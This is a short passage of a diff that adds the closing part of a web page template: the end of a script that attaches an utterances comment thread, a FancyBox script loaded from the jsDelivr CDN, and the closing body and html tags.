+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+
+
+<!-- FancyBox -->
+
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+  
+</body>
+</html>
